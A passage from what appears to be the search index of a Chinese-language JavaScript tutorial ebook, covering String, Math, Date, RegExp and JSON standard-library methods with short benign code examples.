\u539f\u5b57\u7b26\u4e32\u662f\u5426\u5339\u914d\u67d0\u4e2a\u5b50\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u5b58\u653e\u6210\u529f\u5339\u914d\u7684\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u6ca1\u6709\u627e\u5230\u8fd4\u56de\u7684\u662fnull\u3002\u4f20\u5165\u7684\u53c2\u6570\u53ef\u4ee5\u4f7f\u6b63\u5219\u8868\u8fbe\u5f0f\u3002\u8fd4\u56de\u7684\u6570\u7ec4\u5177\u6709index input \u5c5e\u6027\uff0c\u53ef\u4ee5\u83b7\u53d6\u5339\u914d\u7684\u539f\u59cb\u5b57\u7b26\u4e32\u548c\u5f00\u59cb\u7684\u4f4d\u7f6e\u3002</li> <li>search('abc') \u4f5c\u7528\u7c7b\u4f3c\u4e8e match \u8fd4\u56de\u503c\u662f\u5339\u914d\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff0c\u5982\u679c\u4e0d\u5339\u914d\u8fd4\u56de\u503c\u662f-1</li> <li>replace('abc', 'cba') \u66ff\u6362\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u7b2c\u4e00\u4e2a\u53c2\u6570\u4e0d\u662f\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5168\u5c40\u5339\u914d\uff0c\u53ea\u66ff\u6362\u7b2c\u4e00\u4e2a\u51fa\u73b0\u7684\u5b57\u7b26\u4e32\u3002</li> <li>split(seperator, how many) \u4f7f\u7528\u5206\u9694\u7b26\u5c06\u5b57\u7b26\u4e32\u5206\u5272\u6210\u6570\u7ec4\u3002\u5982\u679c\u4f20\u5165\u7684\u5206\u9694\u7b26\u662f\u7a7a\u5b57\u7b26\u4e32\uff0c\u90a3\u4e48\u5c31\u628a\u6bcf\u4e00\u4e2a\u5b57\u7b26\u5206\u5272\u3002\u5982\u679c\u4e0d\u4f20\u5165\u5206\u9694\u7b26\uff0c\u8fd4\u56de\u503c\u5c31\u662f\u5b57\u7b26\u4e32\u6570\u7ec4\uff08\u53ea\u6709\u4e00\u9879\uff09\uff1b\u4f20\u5165\u7684\u7b2c\u4e8c\u4e2a\u53ef\u9009\u53c2\u6570\u662f\u8fd4\u56de\u503c\u6570\u7ec4\u7684\u6700\u5927\u957f\u5ea6\u3002\u53ef\u4ee5\u4f20\u5165\u6b63\u5219\u8868\u8fbe\u5f0f\u4f5c\u4e3a\u5206\u9694\u7b26\u3002</li> <li>localeCompare \u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\uff08\u4f7f\u7528\u5b57\u7b26\u4e32\u5b57\u5178\u7684\u4f4d\u7f6e\uff09\u5927\u5199\u5c0f\u4e8e\u5c0f\u5199\uff0c\u8fd4\u56de\u503c\u662f\u6570\u5b57\uff0c\u5982\u679c\u4e24\u4e2a\u5b57\u7b26\u4e32\u76f8\u7b49\u8fd4\u56de0\u3002\u5229\u7528\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u53ef\u4ee5\u5bf9\u5b57\u7b26\u4e32\u8fdb\u884c\u6392\u5e8f\u8f93\u51fa\u3002\u9ed8\u8ba4\u6309\u7167\u82f1\u6587\u6bd4\u8f83\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u53ef\u4ee5\u4f20\u5165\u5176\u4ed6\u8bed\u8a00\u6bd4\u8f83\u3002</li> </ul>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#58-math","title":"5.8 Math \u5bf9\u8c61","text":"<p>Math \u5bf9\u8c61\u4e0d\u662f\u6784\u9020\u51fd\u6570\uff0c\u9759\u6001\u5c5e\u6027\u3001\u9759\u6001\u65b9\u6cd5\u5fc5\u987b\u5728\u539f\u751f\u5bf9\u8c61\u4e0a\u4f7f\u7528\uff0c\u63d0\u4f9b\u5e38\u7528\u7684\u6570\u5b66\u65b9\u6cd5</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_16","title":"\u9759\u6001\u5c5e\u6027","text":"<p>\u83b7\u53d6\u6570\u5b66\u5e38\u91cf</p> <p>Math.PI</p> <p>Math.E</p> <p>Math.SQRT2</p> <p>Math.LN2</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_17","title":"\u9759\u6001\u65b9\u6cd5","text":"<p>ceil floor \u53d6\u6574\u51fd\u6570</p> <p>pow \u6307\u6570 log \u5bf9\u6570</p> <p>sqrt \u5e73\u65b9\u6839 round \u56db\u820d\u4e94\u5165</p> <p>random \u968f\u673a\u503c</p> <p>\u6240\u6709\u4e09\u89d2\u51fd\u6570\uff08\u53c2\u6570\u662f\u5f27\u5ea6\uff09</p> <p>\u83b7\u53d6\u6700\u503c\u65f6\uff0c\u4f20\u5165\u7684\u53c2\u6570\u662f\u82e5\u5e72\u4e2a\u6570\u503c\u3002\u5982\u679c\u4f20\u5165\u6570\u503c\u6570\u7ec4\uff0c\u8fd4\u56de\u503c\u662fNaN\u3002</p> <p>random\u4ea7\u751f\u7684\u968f\u673a\u503c\u662f[0, 1);</p> <p>\u4f8b\u5b50</p> <p>\u8fd4\u56de\u4e00\u4e2a\u4efb\u610f\u8303\u56f4\u5185\u7684\u968f\u673a\u6570</p> <pre><code>function getRandomInt(min, max) {\n  return Math.floor(Math.random() * (max - min + 1)) + min;\n}\n</code></pre> <p>\u8fd4\u56de\u968f\u673a\u5b57\u7b26\u4e32</p> <pre><code>function random_str(length) {\n  var ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';\n  ALPHABET += 'abcdefghijklmnopqrstuvwxyz';\n  ALPHABET += '0123456789-_';\n  var str = '';\n  for (var i = 0; i &lt; length; ++i) {\n    var rand = Math.floor(Math.random() * ALPHABET.length);\n    str += ALPHABET.substring(rand, rand + 1);\n  }\n  return str;\n}\nrandom_str(6) // \"NdQKOr\"\n</code></pre>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#59-date","title":"5.9 Date \u5bf9\u8c61","text":"<p>\u56fd\u9645\u6807\u51c6\u65f6\u95f4\uff08UTC\uff09 1970-01-01\u4f5c\u4e3a\u65f6\u95f4\u7684\u96f6\u70b9</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_18","title":"\u5de5\u5177\u51fd\u6570","text":"<p>\u5de5\u5177\u51fd\u6570 Date() \u8fd4\u56de\u5f53\u524d\u65f6\u95f4\u7684\u5b57\u7b26\u4e32\uff0c\u5982\u679c\u4f20\u53c2\uff0c\u4ecd\u7136\u8fd4\u56de\u5f53\u524d\u65f6\u95f4\u7684\u5b57\u7b26\u4e32\u3002</p> <pre><code>'Mon Jul 08 2019 11:47:21 GMT+0800 (\u4e2d\u56fd\u6807\u51c6\u65f6\u95f4)'\n</code></pre>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_19","title":"\u6784\u9020\u51fd\u6570","text":"<p>\u53ef\u4ee5\u628a\u53c2\u6570\u8f6c\u6362\u6210\u65f6\u95f4\u5904\u7406\uff1b\u5982\u679c\u4e0d\u4f20\u53c2\uff0c\u83b7\u53d6\u7684\u5b9e\u4f8b\u5c31\u662f\u5f53\u524d\u7684\u65f6\u95f4</p> <pre><code>let today = new Date();\n</code></pre> <p>\u53c2\u6570\u7c7b\u578b\u5f88\u591a\uff0c\u90fd\u53ef\u4ee5\u8f6c\u6362\u6210\u65f6\u95f4\u5bf9\u8c61\uff0c\u53ea\u8981\u662f\u80fd\u88ab<code>Date.parse()</code>\u65b9\u6cd5\u89e3\u6790\u7684\u5b57\u7b26\u4e32\uff0c\u90fd\u53ef\u4ee5\u5f53\u4f5c\u53c2\u6570\u3002\u5982\u679c\u53c2\u6570\u662f\u8d1f\u6570\uff0c\u8868\u793a1970\u5e74\u524d\u7684\u65f6\u95f4\u3002</p> <pre><code>// \u53c2\u6570\u4e3a\u65f6\u95f4\u96f6\u70b9\u5f00\u59cb\u8ba1\u7b97\u7684\u6beb\u79d2\u6570\nnew Date(1378218728000)\n// Tue Sep 03 2013 22:32:08 GMT+0800 (CST)\n\n// \u53c2\u6570\u4e3a\u65e5\u671f\u5b57\u7b26\u4e32\nnew Date('January 6, 2013');\n// Sun Jan 06 2013 00:00:00 GMT+0800 (CST)\n\n// \u53c2\u6570\u4e3a\u591a\u4e2a\u6574\u6570\uff0c\n// \u4ee3\u8868\u5e74\u3001\u6708\u3001\u65e5\u3001\u5c0f\u65f6\u3001\u5206\u949f\u3001\u79d2\u3001\u6beb\u79d2\nnew Date(2013, 0, 1, 0, 0, 0, 0)\n// Tue Jan 01 2013 00:00:00 GMT+0800 (CST)\n</code></pre> <p>\u53c2\u6570\u7684\u5177\u4f53\u89c4\u5219\u5f88\u590d\u6742\uff0c\u8be6\u60c5\u53c2\u8003 https://wangdoc.com/javascript/stdlib/date.html \u5982\u679c\u6d89\u53ca\u65f6\u533a\u9700\u8981\u8f6c\u6362\u3002\u8fd8\u6709\u5f88\u591a\u7b2c\u4e09\u65b9\u5e93\u53bb\u5904\u7406\u65f6\u95f4\u3002[www.datejs.com] \u65e5\u671f\u5b57\u7b26\u4e32\uff0c\u6beb\u79d2\u6570\u7b49\u90fd\u53ef\u4ee5\u8f6c\u6362\u3002</p> <p>\u5982\u679c\u4e24\u4e2a\u65e5\u671f\u5bf9\u8c61\u51cf\u8fd0\u7b97\uff0c\u9996\u5148\u8f6c\u5316\u6210\u6570\u503c\uff08\u6beb\u79d2\uff09\uff0c\u8fd4\u56de\u7684\u5c31\u662f\u65e5\u671f\u7684\u5dee\u503c\uff08\u6beb\u79d2\u6570\uff09\uff1b\u5982\u679c\u4e24\u4e2a\u65f6\u95f4\u76f8\u52a0\uff0c\u9996\u5148\u8f6c\u5316\u6210\u5b57\u7b26\u4e32\uff0c\u7ed3\u679c\u5c31\u662f\u4e24\u4e2a\u5b57\u7b26\u4e32\u7684\u62fc\u63a5\uff08\u4e0d\u662f\u52a0\u5728\u4e00\u8d77\u7684\u6beb\u79d2\u6570\uff09</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_20","title":"\u9759\u6001\u65b9\u6cd5","text":"<p>Date.now() \u73b0\u5728\u8ddd\u79bb1970\u5e74\u7684\u6beb\u79d2\u6570\uff0c\u662f\u5f53\u5730\u65f6\u533a\u7684\u65f6\u95f4</p> <p>Date.parse() \u5c06\u5b57\u7b26\u4e32\u8f6c\u6362\u6210\u6beb\u79d2\u6570\uff0c\u5982\u679c\u5b57\u7b26\u4e32\u4e0d\u5408\u9002\uff0c\u8fd4\u56deNaN\uff1b\u4e0b\u9762\u662f\u7b26\u5408\u7684\u5b57\u7b26\u4e32</p> <pre><code>Date.parse('Aug 9, 1995')\nDate.parse('January 26, 2011 13:51:50')\nDate.parse('Mon, 25 Dec 1995 13:30:00 GMT')\nDate.parse('Mon, 25 Dec 1995 13:30:00 +0430')\nDate.parse('2011-10-10')\nDate.parse('2011-10-10T14:48:00')\n</code></pre> <p>Date.UTC() \u8f6c\u6362\u6210\u4e16\u754c\u6807\u51c6\u65f6\u95f4\u7684\u6beb\u79d2\u6570</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_21","title":"\u5b9e\u4f8b\u65b9\u6cd5","text":"<p>\u5b9e\u4f8b\u65b9\u6cd5\u5206\u4e3a to get set \u7b49\uff0c\u53ef\u4ee5\u76f4\u63a5\u83b7\u53d6\u6216\u8005\u8bbe\u7f6e\u65f6\u95f4\uff08\u5b57\u7b26\u4e32\u3001JSON\u3001\u6807\u51c6\u65f6\u95f4\u3001\u5f53\u5730\u65f6\u95f4\u3001\u5e74\u6708\u65e5\u65f6\u5206\u79d2\u3001\u6beb\u79d2\u7b49\uff09\u4f7f\u7528\u65b9\u6cd5\u53c2\u89c1\u4e0a\u9762\u7684\u94fe\u63a5\u3002</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#510-regexp","title":"5.10 RegExp \u6b63\u5219\u5bf9\u8c61","text":""},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_22","title":"\u521b\u5efa\u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p>\u521b\u5efa\u6b63\u5219\u8868\u8fbe\u5f0f\u6709\u4e24\u79cd\u65b9\u6cd5\uff0c\u6784\u9020\u51fd\u6570\u548c\u5bf9\u8c61\u5b57\u9762\u91cf\uff1b\u5bf9\u8c61\u5b57\u9762\u91cf\u5c31\u662f\u4e24\u4e2a\u659c\u6760\uff1b\u4f7f\u7528\u5b57\u9762\u91cf\u521b\u5efa\u6b63\u5219\u5bf9\u8c61\u66f4\u591a\u89c1\uff0c\u65b9\u4fbf\u589e\u52a0\u4fee\u9970\u7b26\u3002\u7b2c\u4e8c\u4e2a\u6848\u4f8b\u4e2d\u58f0\u660e\u6b63\u5219\u5bf9\u8c61\u662f\u7b49\u4ef7\u7684\u3002</p> <pre><code>let arr = [];\nlet obj = {};\nlet reg = /xyz/; // \u5982\u679c\u662f\u7a7a\u7684\u5c31\u8868\u793a\u6ce8\u91ca\uff0c\u4f1a\u62a5\u8bed\u6cd5\u9519\u8bef\nlet reg2 = new RegExp('xyz');\n</code></pre> <pre><code>let reg = /xyz/g;\nlet reg = new RegExp('xyz', 'g');\n</code></pre> <p>https://wangdoc.com/javascript/stdlib/regexp.html</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_23","title":"\u5b9e\u4f8b\u5c5e\u6027","text":"<p>\u5224\u65ad\u6b63\u5219\u5bf9\u8c61\u5177\u6709\u54ea\u4e9b\u4fee\u9970\u7b26 flags\uff0c\u8fd9\u662f\u53ea\u8bfb\u5c5e\u6027\u3002\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u5c5e\u6027\u4e0d\u5e38\u7528\u3002</p> <pre><code>let reg = /abc/igm;\nconsole.log(reg.flags);\n</code></pre>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_24","title":"\u5b9e\u4f8b\u65b9\u6cd5","text":"<p>test \u67e5\u770b\u5b57\u7b26\u4e32\u662f\u5426\u5339\u914d\uff0c\u8fd4\u56de\u5e03\u5c14\u503c\uff1b\u5982\u679c\u6b63\u5219\u5bf9\u8c61\u662f\u7a7a\uff0c\u90a3\u4e48\u6240\u6709\u5b57\u7b26\u4e32\u8fd4\u56de\u771f\u3002\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u662fundefined</p> <pre><code>console.log(/abc/.test('abcdef')); // true\n</code></pre> <p>exec \u67e5\u770b\u5b57\u7b26\u4e32\u662f\u5426\u5339\u914d\uff0c\u8fd4\u56de\u503c\u662f\u5339\u914d\u7684\u5b57\u7b26\u4e32\u6784\u6210\u7684\u6570\u7ec4\u3002\u5982\u679c\u6ca1\u6709\u5339\u914d\u5230\uff0c\u8fd4\u56de\u7684\u662fnull\u3002\u9ed8\u8ba4\u6b63\u5219\u8fd4\u56de\u7684\u6570\u7ec4\u957f\u5ea6\u5c31\u662f1\uff0c\u5185\u5bb9\u548c\u539f\u59cb\u6b63\u5219\u5185\u5bb9\u76f8\u540c\u3002\u5982\u679c\u6b63\u5219\u5305\u542b\u62ec\u53f7\uff0c\u8fd4\u56de\u7684\u662f\u53ef\u80fd\u7684\u591a\u4e2a\u7ec4\u5408\u3002</p> <pre><code>let reg = /a(b+)a/;\nlet arr = reg.exec('_abbba_aba_');\narr // ['abbba', 'bbb']\n</code></pre>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_25","title":"\u6b63\u5219\u548c\u5b57\u7b26\u4e32\u7ed3\u5408","text":"<p>match search replace split </p> <p>match \u8fd4\u56de\u5339\u914d\u7684\u5b57\u7b26\u4e32\u6570\u7ec4\uff08\u5931\u8d25\u8fd4\u56denull\uff09</p> <p>search \u8fd4\u56de\u5339\u914d\u5b57\u7b26\u4e32\u7684\u4f4d\u7f6e\uff08\u5931\u8d25\u8fd4\u56de-1\uff09</p> <p>replace \u6309\u7167\u7b2c\u4e00\u4e2a\u53c2\u6570\u5339\u914d\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u66ff\u6362\u6210\u7b2c\u4e8c\u4e2a\u5b57\u7b26\u4e32\u3002\u901a\u5e38\u4fee\u9970\u7b26\u662fg\u7528\u6765\u66ff\u6362\u5168\u90e8\u7684\u5b57\u7b26\u4e32\u3002replace \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u590d\u6742\u7528\u6cd5 https://wangdoc.com/javascript/stdlib/regexp.html</p> <pre><code>'aaa'.replace(/a/g, 'b'); // 'bbb'\n'  testabg  '.replace(/^\\s+|\\s+$/, ''); // \u53bb\u6389\u5b57\u7b26\u4e32\u9996\u5c3e\u7684\u7a7a\u683c\n</code></pre> <p>split \u4f7f\u7528\u6b63\u5219\u4f5c\u4e3a\u5206\u9694\u7b26\uff08\u53ef\u4ee5\u4f7f\u7528\u591a\u79cd\u5206\u9694\u7b26\uff09</p> <pre><code>let str = 'a ,b, c,  d';\nlet arr1 = str.split(',');\nlet arr2 = str.split(/, */); // \u8fd9\u6837\u53ef\u4ee5\u53bb\u9664\u591a\u4f59\u7684\u7a7a\u683c\n</code></pre> <p>\u5e38\u7528\u7684\u662f replace \u548c split \u65b9\u6cd5</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#_26","title":"\u590d\u6742\u7684\u5339\u914d\u89c4\u5219","text":"<p>https://wangdoc.com/javascript/stdlib/regexp.html</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#5101","title":"5.10.1 \u5b57\u9762\u91cf\u5b57\u7b26\u548c\u5143\u5b57\u7b26","text":"<ul> <li> <p>\u5b57\u9762\u91cf\u5b57\u7b26\uff1a\u5355\u72ec\u4e00\u4e2a\u5b57\u7b26\u4e32<code>/dog/.text('small dog')</code></p> </li> <li> <p>\u70b9\u5b57\u7b26\uff08.\uff09\u5339\u914d\u9664\u53bb\u56de\u8f66\u6362\u884c\u7684\u4efb\u4f55\u4e00\u4e2a\u5b57\u7b26 <code>/d.g/</code> \u53ef\u4ee5\u5339\u914d <code>'dig'</code> \u4e0d\u80fd\u5339\u914d <code>'drag'</code></p> </li> <li> <p>\u6216\u5b57\u7b26\uff08|\uff09\u8868\u793a\u6216\uff0c<code>/cat|dog/</code> \u8868\u793a\u6ee1\u8db3\u4efb\u4f55\u4e00\u4e2a\u6761\u4ef6\u5373\u53ef</p> </li> <li> <p>\u5f00\u59cb\u7b26\u53f7\uff08^\uff09\u5fc5\u987b\u4ee5\u8fd9\u4e2a\u5b57\u7b26\u5f00\u59cb\uff1b</p> </li> <li> <p>\u7ed3\u675f\u7b26\u53f7\uff08$) \u5fc5\u987b\u4ee5\u8fd9\u4e2a\u5b57\u7b26\u7ed3\u675f</p> </li> </ul> <p>\u9009\u62e9\u3001\u5f00\u59cb\u3001\u7ed3\u675f\u901a\u5e38\u540c\u65f6\u4f7f\u7528\uff0c\u4f7f\u7528\u5f88\u591a <code>/^test$/.test('test 123 test')</code> return false;</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#5102","title":"5.10.2 \u8f6c\u4e49\u7b26","text":"<p>\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u7684\u7279\u6b8a\u7b26\u53f7\u9700\u8981\u7ecf\u8fc7\u8f6c\u4e49\uff0c\u5728\u7b26\u53f7\u524d\u52a0\u4e0a\u53cd\u659c\u6760\u5373\u53ef <code>/1\\+1/.test('1+1')</code> \u9700\u8981\u8f6c\u4e49\u7684\u7b26\u53f7\u4e00\u517112\u4e2a\u3002</p> <p>\u5982\u679c\u4f7f\u7528\u6b63\u5219\u5bf9\u8c61\u5b57\u9762\u91cf\u521b\u5efa\u6b63\u5219\u5bf9\u8c61\uff0c\u4e00\u4e2a\u8f6c\u4e49\u7b26\u53f7\uff1b</p> <p>\u5982\u679c\u4f7f\u7528\u6784\u9020\u51fd\u6570\u521b\u5efa\u6b63\u5219\u5bf9\u8c61\uff0c\u9700\u8981\u52a0\u5165\u4e24\u4e2a\u8f6c\u4e49\u7b26\u53f7\uff08\u56e0\u4e3a\u5b57\u7b26\u4e32\u5185\u90e8\u53cd\u659c\u6760\u4e5f\u662f\u8f6c\u4e49\u5b57\u7b26\uff0c\u4e24\u4e2a\u53cd\u659c\u6760\u5148\u8f6c\u4e49\u6210\u4e00\u4e2a\u53cd\u659c\u6760\uff0c\u7136\u540e\u88ab\u6b63\u5219\u8868\u8fbe\u5f0f\u518d\u8f6c\u4e49\u4e00\u6b21\uff0c\u6240\u4ee5\u907f\u514d\u4f7f\u7528\u6784\u9020\u51fd\u6570\u521b\u5efa\u6b63\u5219\u8868\u8fbe\u5f0f\u5bf9\u8c61\uff09</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#5103","title":"5.10.3 \u7279\u6b8a\u7b26","text":"<p>\u200b   \u56de\u8f66\u6362\u884c\u5206\u9875\u7b49\u6587\u672c\u64cd\u4f5c\u7b26\u53f7 null </p> <ul> <li><code>\\cX</code> \u8868\u793a<code>Ctrl-[X]</code>\uff0c\u5176\u4e2d\u7684<code>X</code>\u662fA-Z\u4e4b\u4e2d\u4efb\u4e00\u4e2a\u82f1\u6587\u5b57\u6bcd\uff0c\u7528\u6765\u5339\u914d\u63a7\u5236\u5b57\u7b26\u3002</li> <li><code>[\\b]</code> \u5339\u914d\u9000\u683c\u952e(U+0008)\uff0c\u4e0d\u8981\u4e0e<code>\\b</code>\u6df7\u6dc6\u3002</li> <li><code>\\n</code> \u5339\u914d\u6362\u884c\u952e\u3002</li> <li><code>\\r</code> \u5339\u914d\u56de\u8f66\u952e\u3002</li> <li><code>\\t</code> \u5339\u914d\u5236\u8868\u7b26 tab\uff08U+0009\uff09\u3002</li> <li><code>\\v</code> \u5339\u914d\u5782\u76f4\u5236\u8868\u7b26\uff08U+000B\uff09\u3002</li> <li><code>\\f</code> \u5339\u914d\u6362\u9875\u7b26\uff08U+000C\uff09\u3002</li> <li><code>\\0</code> \u5339\u914d<code>null</code>\u5b57\u7b26\uff08U+0000\uff09\u3002</li> <li><code>\\xhh</code> \u5339\u914d\u4e00\u4e2a\u4ee5\u4e24\u4f4d\u5341\u516d\u8fdb\u5236\u6570\uff08<code>\\x00</code>-<code>\\xFF</code>\uff09\u8868\u793a\u7684\u5b57\u7b26\u3002</li> <li><code>\\uhhhh</code> \u5339\u914d\u4e00\u4e2a\u4ee5\u56db\u4f4d\u5341\u516d\u8fdb\u5236\u6570\uff08<code>\\u0000</code>-<code>\\uFFFF</code>\uff09\u8868\u793a\u7684 Unicode \u5b57\u7b26\u3002</li> </ul>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#5104","title":"5.10.4 \u5b57\u7b26\u7c7b","text":"<p>\u8868\u793a\u53ef\u4ee5\u6709\u4e00\u7cfb\u5217\u5b57\u7b26\u53ef\u4ee5\u5339\u914d\uff0c\u6ee1\u8db3\u4e00\u4e2a\u5b57\u7b26\u5373\u53ef\uff08\u6216\u5b57\u7b26\u53ef\u4ee5\u5339\u914d\u591a\u4e2a\u5355\u8bcd\uff0c\u5b57\u7b26\u7c7b\u53ef\u4ee5\u5339\u914d\u591a\u4e2a\u5b57\u7b26\uff09</p> <p><code>/[abc]/.test('orange') =&gt; false</code> \u540c\u65f6 <code>/[abc]/.test('banana') =&gt; true</code></p> <ul> <li>\u8131\u5b57\u7b26 <code>/[^abc]/.test('nanana') =&gt; true</code> \u53ea\u6709\u5b57\u7b26\u4e32\u4e2d\u5177\u6709abc \u5916\u7684\u5176\u4ed6\u5b57\u7b26\u5c31\u8fd4\u56detrue</li> <li>\u8fde\u5b57\u7b26<code>/[a-fA-F]/</code> \u53ef\u4ee5\u7701\u7565\u8fde\u7eed\u7684\u5b57\u7b26\u6570\u5b57\u7b49\uff08\u6ce8\u610f\uff0c\u5927\u5199\u548c\u5c0f\u5199\u4e2d\u95f4\u6709\u5176\u4ed6\u5b57\u7b26\uff0c\u4e0d\u80fd<code>/[a-Z]/</code>\uff09</li> </ul>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#5105","title":"5.10.5 \u9884\u5b9a\u4e49\u6a21\u5f0f","text":"<p><code>\\d\\w\\s</code>  \u5206\u522b\u5339\u914d\u6570\u5b57\u3001\u5b57\u6bcd\u6570\u5b57\u4e0b\u5212\u7ebf\u3001\u7a7a\u683c\uff08\u6362\u884c\uff09\u5982\u679c\u662f\u5927\u5199\u5c31\u662f\u76f8\u53cd\u7684\u5339\u914d</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#5106","title":"5.10.6 \u91cd\u590d\u7c7b\u91cf\u8bcd\u7b26","text":"<p>{n, m} \u8868\u793a\u4e00\u4e2a\u5b57\u7b26\u51fa\u73b0\u7684\u6b21\u6570\uff0c\u5982\u679c\u4f20\u5355\u4e2a\u53c2\u6570\u8868\u793a\u786e\u5b9a\u7684\u6b21\u6570\uff0c\u5982\u679cm\u662f\u7a7a\u8868\u793a\u6ca1\u6709\u6700\u5927\u503c\u3002</p> <p>? * + \u662f\u4e0a\u9762\u7684\u91cd\u590d\u7c7b\u7684\u7b80\u5199</p> <p>?\u7b49\u4ef7\u4e8e {0, 1}</p> <p>*\u7b49\u4ef7\u4e8e {0, }</p> <p>+\u7b49\u4ef7\u4e8e {1, }</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#5107","title":"5.10.7 \u4fee\u9970\u7b26","text":"<p>g \u5168\u5c40\u5339\u914d</p> <p>i \u5ffd\u7565\u5927\u5c0f\u5199\u5339\u914d</p> <p>m \u5ffd\u7565\u6362\u884c\u7b26\uff08^$\uff09\u524d\u540e\u6709\u6362\u884c\u7b26\u53ef\u4ee5\u5339\u914d</p> <p>\u6b64\u5916\uff0c\u8fd8\u6709\u8d2a\u5a6a\u6a21\u5f0f\u3001\u7ec4\u5339\u914d\uff08\u62ec\u53f7\u8868\u793a\u5206\u7ec4\u5339\u914d\uff0c\u62ec\u53f7\u7684\u5d4c\u5957\u3001\u975e\u6355\u83b7\u7ec4\u3001\u5148\u884c\u65ad\u8a00\uff09\u9700\u8981\u7684\u65f6\u5019\u52a0\u5f3a</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#511-json","title":"5.11 JSON \u5bf9\u8c61","text":"<p>JSON \u683c\u5f0f\uff1a\u89c4\u8303\u4e25\u683c\uff0c\u4e3b\u8981\u7528\u4e8e\u6570\u636e\u4f20\u8f93\uff0c\u53d6\u4ee3 XML\u3002</p> <p>JSON \u5bf9\u8c61\uff1aJS \u4e2d\u7684\u539f\u751f\u5bf9\u8c61\uff0c\u5177\u6709\u4e0b\u9762\u4e24\u4e2a\u65b9\u6cd5 JSON.parse(), JSON.stringify()</p> <p>\u5982\u679c\u8282\u70b9\u5f88\u591a\uff0c\u4f7f\u7528\u8fd9\u4e24\u4e2a\u529e\u6cd5\u5f88\u6d88\u8017\u6027\u80fd\uff1a20ms\u5de6\u53f3\u3002</p>"},{"location":"ebook-JS-basic/05-%E6%A0%87%E5%87%86%E5%BA%93/#jsonstringify","title":"JSON.stringify()","text":"<p>JSON.stringify(para1, para2, para3) \u628aJSON\u8f6c\u6362\u6210\u5b57\u7b26\u4e32</p> <p>\u901a\u5e38\u4f7f\u7528\u7b2c\u4e00\u4e2a\u53c2\u6570\uff1a\u5c06\u4e00\u4e2a\u5408\u6cd5\u7684\u503c\u8f6c\u5316\u6210JSON\u5b57\u7b26\u4e32\uff0c\u8fd9\u4e2a\u503c\u53ef\u4ee5\u4f7f\u7b80\u5355\u7c7b\u578b\u6216\u8005\u5f15\u7528\u7c7b\u578b\uff08\u5bf9\u8c61\u6570\u7ec4\uff09\u3002\u5982\u679c\u5bf9\u8c61\u7684\u5c5e\u6027\u662f undefined, \u51fd\u6570\u6216\u8005XML\u5bf9\u8c61\uff0c\u90a3\u4e48\u5c31\u4f1a\u5ffd\u7565\u8fd9\u4e2a\u5c5e\u6027\uff1b\u5982\u679c\u6570\u7ec4\u7684\u6210\u5458\u662f\u4e0a\u9762\u4e09\u79cd\u60c5\u51b5\uff0c\u4f1a\u8f6c\u5316\u6210null\u3002\u8f6c\u6362\u8fc7\u7a0b\u4e2d\u4f1a\u5ffd\u7565\u5bf9\u8c61\u7684\u4e0d\u53ef\u904d\u5386\u5c5e\u6027</p> <p>\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u53ef\u9009\u53c2\u6570\uff0c\u53ef\u4ee5\u8bbe\u7f6e\u8f6c\u6362\u540e\u5b57\u7b26\u4e32\u7684\u7c7b\u578b\uff0c\u6216\u8005\u6279\u91cf\u5904\u7406\u8f6c\u6362\u5bf9\u8c61\u7684\u952e\u503c\u5bf9\u3002</p> 